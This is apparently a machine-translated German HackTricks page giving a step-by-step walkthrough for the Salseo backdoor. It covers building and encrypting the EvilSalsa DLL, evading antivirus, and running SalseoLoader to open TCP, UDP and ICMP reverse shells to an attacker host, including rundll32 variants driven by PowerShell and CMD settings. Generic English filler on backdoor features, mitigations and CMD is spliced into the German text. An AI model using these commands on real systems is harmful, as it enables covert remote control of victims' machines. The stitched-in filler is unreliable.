# Salseo

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## Kompilieren der Binärdateien

Laden Sie den Quellcode von GitHub herunter und kompilieren Sie **EvilSalsa** und **SalseoLoader**. Sie benötigen **Visual Studio**, um den Code zu kompilieren.

Kompilieren Sie diese Projekte für die Architektur des Windows-Systems, auf dem Sie sie verwenden möchten (Wenn Windows x64 unterstützt, kompilieren Sie sie für diese Architekturen).

Sie können die **Architektur** in Visual Studio im **linken "Build" Tab** unter **"Platform Target"** auswählen.

(\*\*Wenn Sie diese Optionen nicht finden können, klicken Sie auf **"Project Tab"** und dann auf **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Bauen Sie dann beide Projekte (Build -> Build Solution) (Im Log wird der Pfad der ausführbaren Datei angezeigt):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Vorbereiten des Backdoors

Zunächst müssen Sie die **EvilSalsa.dll** verschlüsseln. Dazu können Sie das Python-Skript **encrypterassembly.py** verwenden oder das Projekt **EncrypterAssembly** kompilieren:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo

Salseo is a backdoor that allows remote access to a compromised Windows system. It is commonly used by attackers to maintain persistence and control over the compromised system.

##### Features

- **Remote Access**: Salseo provides remote access to the compromised system, allowing the attacker to execute commands and interact with the system.
- **Persistence**: Salseo is designed to maintain persistence on the compromised system, ensuring that the attacker can regain access even after system reboots.
- **Stealth**: Salseo is capable of hiding its presence on the compromised system, making it difficult to detect and remove.
- **Command Execution**: Salseo allows the attacker to execute arbitrary commands on the compromised system, giving them full control over the system.
- **File Management**: Salseo enables the attacker to upload, download, and delete files on the compromised system.
- **Keylogging**: Salseo can capture keystrokes on the compromised system, allowing the attacker to gather sensitive information such as passwords.
- **Screenshot Capture**: Salseo is capable of capturing screenshots of the compromised system, providing the attacker with visual information about the user's activities.
- **Network Communication**: Salseo communicates with the attacker's command and control (C2) server over the network, enabling the attacker to remotely control the compromised system.

##### Mitigation

To mitigate the risk of Salseo and similar backdoors, it is important to follow these security best practices:

- **Keep Software Updated**: Regularly update the operating system and all installed software to patch any known vulnerabilities.
- **Use Strong Passwords**: Implement strong, unique passwords for all user accounts on the system.
- **Enable Firewall**: Enable and configure a firewall to restrict incoming and outgoing network traffic.
- **Use Antivirus Software**: Install and regularly update antivirus software to detect and remove malicious programs.
- **Monitor Network Traffic**: Monitor network traffic for any suspicious activity or connections to known malicious IP addresses.
- **Educate Users**: Provide security awareness training to users to help them recognize and avoid social engineering attacks.

By following these best practices, you can significantly reduce the risk of Salseo and other backdoors compromising your Windows system.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, jetzt haben Sie alles, was Sie brauchen, um das gesamte Salseo-Ding auszuführen: die **kodierte EvilDalsa.dll** und die **Binärdatei von SalseoLoader**.

**Laden Sie die SalseoLoader.exe-Binärdatei auf die Maschine hoch. Sie sollte von keinem AV erkannt werden...**

## **Ausführen des Backdoors**

### **Erhalten einer TCP Reverse Shell (Herunterladen der codierten DLL über HTTP)**

Denken Sie daran, einen nc als Reverse-Shell-Listener zu starten und einen HTTP-Server zu starten, um die kodierte evilsalsa bereitzustellen.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Erhalten einer UDP Reverse Shell (Herunterladen einer codierten DLL über SMB)**

Denken Sie daran, einen nc als Reverse Shell-Listener zu starten und einen SMB-Server zum Bereitstellen der codierten evilsalsa (impacket-smbserver) zu verwenden.
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Erhalten einer ICMP Reverse Shell (kodierte DLL bereits im Opfer)**

**Dieses Mal benötigen Sie ein spezielles Tool auf dem Client, um die Reverse Shell zu empfangen. Laden Sie es herunter:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Deaktivieren von ICMP-Antworten:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Führe den Client aus:

```bash
./client
```

Dieser Befehl führt den Client aus.
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Innerhalb des Opfers führen wir das Salseo-Ding aus:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompilieren von SalseoLoader als DLL mit exportierter Hauptfunktion

Öffnen Sie das SalseoLoader-Projekt mit Visual Studio.

### Fügen Sie vor der Hauptfunktion hinzu: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Installieren Sie DllExport für dieses Projekt

#### **Tools** --> **NuGet-Paket-Manager** --> **NuGet-Pakete für Lösung verwalten...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Suchen Sie nach dem DllExport-Paket (über den Tab "Durchsuchen") und klicken Sie auf Installieren (und akzeptieren Sie den Popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

In Ihrem Projektordner sind die Dateien **DllExport.bat** und **DllExport\_Configure.bat** erschienen.

### **DllExport deinstallieren**

Klicken Sie auf **Deinstallieren** (ja, es ist seltsam, aber vertrauen Sie mir, es ist notwendig)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Visual Studio beenden und DllExport\_Configure ausführen**

Beenden Sie einfach Visual Studio

Gehen Sie dann zu Ihrem **SalseoLoader-Ordner** und führen Sie **DllExport\_Configure.bat** aus.

Wählen Sie **x64** (wenn Sie es in einer x64-Box verwenden möchten, das war mein Fall), wählen Sie **System.Runtime.InteropServices** (innerhalb des **Namespace für DllExport**) und klicken Sie auf **Anwenden**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Öffnen Sie das Projekt erneut mit Visual Studio**

**\[DllExport]** sollte nicht mehr als Fehler markiert sein

![](<../.gitbook/assets/image (8) (1).png>)

### Lösung erstellen

Wählen Sie **Ausgabetyp = Klassenbibliothek** (Projekt --> SalseoLoader Eigenschaften --> Anwendung --> Ausgabetyp = Klassenbibliothek)

![](<../.gitbook/assets/image (10) (1).png>)

Wählen Sie **x64-Plattform** (Projekt --> SalseoLoader Eigenschaften --> Erstellen --> Zielplattform = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Um die Lösung zu **erstellen**: Build --> Lösung erstellen (Im Ausgabekonsolenfenster wird der Pfad zur neuen DLL angezeigt)

### Testen Sie die generierte DLL

Kopieren Sie die DLL an den gewünschten Ort und fügen Sie sie ein.

Führen Sie aus:
```
rundll32.exe SalseoLoader.dll,main
```
Wenn kein Fehler angezeigt wird, haben Sie wahrscheinlich eine funktionale DLL!!

## Erhalten Sie eine Shell mit der DLL

Vergessen Sie nicht, einen **HTTP**-**Server** zu verwenden und einen **nc**-**Listener** einzurichten

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It allows users to interact with the operating system by executing commands. CMD provides a wide range of commands that can be used to perform various tasks, such as managing files and directories, running programs, configuring system settings, and more.

CMD is a powerful tool for both legitimate users and hackers. It can be used to execute malicious commands and carry out various hacking activities. Hackers can leverage CMD to gain unauthorized access to systems, escalate privileges, execute remote commands, and perform other malicious actions.

As a hacker, it is important to have a good understanding of CMD and its capabilities. By mastering CMD, you can effectively exploit vulnerabilities, gain control over systems, and carry out successful attacks. However, it is crucial to use this knowledge responsibly and ethically, adhering to legal and ethical guidelines.

To become proficient in CMD, it is recommended to practice using various commands and familiarize yourself with their functionalities. Additionally, staying updated with the latest security measures and techniques can help you defend against CMD-based attacks and protect your systems from unauthorized access.

Remember, hacking is a double-edged sword. While it can be used for malicious purposes, it can also be employed for legitimate activities such as penetration testing and securing systems. It is essential to use your skills and knowledge responsibly to ensure the safety and security of computer systems and networks.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
